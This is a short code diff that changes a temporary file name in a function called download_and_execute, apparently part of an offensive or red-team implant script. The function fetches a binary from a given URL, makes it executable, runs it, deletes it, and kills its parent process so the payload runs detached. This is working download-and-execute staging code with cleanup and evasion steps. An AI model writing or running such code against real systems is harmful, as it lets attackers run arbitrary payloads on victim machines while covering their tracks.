@@ -6,14 +6,14 @@ def get_parent_process(process_name):
 def download_and_execute(url):
     if sys.is_linux() or sys.is_macos():
         # Download
-        http.download(url, "./tmp")
-        sys.shell("chmod +x ./tmp")
+        http.download(url, "./tmp.elf")
+        sys.shell("chmod +x ./tmp.elf")
         # Execute
-        sys.exec("./tmp", [], True)
+        sys.exec("./tmp.elf", [], True)
         # Cleanup
-        file.remove("./tmp")
+        file.remove("./tmp.elf")
         # Kill parent process for clean disown
-        ppid = get_parent_process('tmp')
+        ppid = get_parent_process('tmp.elf')
         if ppid != '1':
             process.kill(ppid)
 
